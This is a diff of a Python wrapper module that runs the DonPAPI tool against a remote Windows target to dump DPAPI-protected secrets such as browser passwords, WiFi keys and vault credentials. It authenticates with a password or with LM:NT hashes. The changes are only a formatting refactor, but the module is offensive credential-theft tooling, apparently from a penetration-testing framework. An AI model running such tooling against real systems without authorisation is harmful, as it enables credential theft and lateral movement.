@@ -3,7 +3,6 @@
 Collects DPAPI-protected secrets: browser passwords, WiFi keys,
 Windows Credentials, Vaults, Certificates, and more.
 """
-from __future__ import annotations
 import subprocess
 import sys
 import shutil
@@ -35,10 +34,10 @@ def run(args: Any) -> int:
     if cred.password:
         cmd.extend(["-p", cred.password])
     elif cred.has_hash:
-        cmd.extend(["-H", "{}:{}".format(cred.lm_hash, cred.nt_hash)])
+        cmd.extend(["-H", f"{cred.lm_hash}:{cred.nt_hash}"])
     cmd.extend(["--output-dir", output_dir])
 
-    print("[*] DonPAPI → {} ({}\\{})".format(target, args.domain, cred.username))
+    print(f"[*] DonPAPI → {target} ({args.domain}\\{cred.username})")
     try:
         result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
         print(result.stdout)
@@ -46,5 +45,5 @@ def run(args: Any) -> int:
             print(result.stderr, file=sys.stderr)
         return result.returncode
     except Exception as exc:
-        print("[-] DonPAPI error: {}".format(exc), file=sys.stderr)
+        print(f"[-] DonPAPI error: {exc}", file=sys.stderr)
         return 1
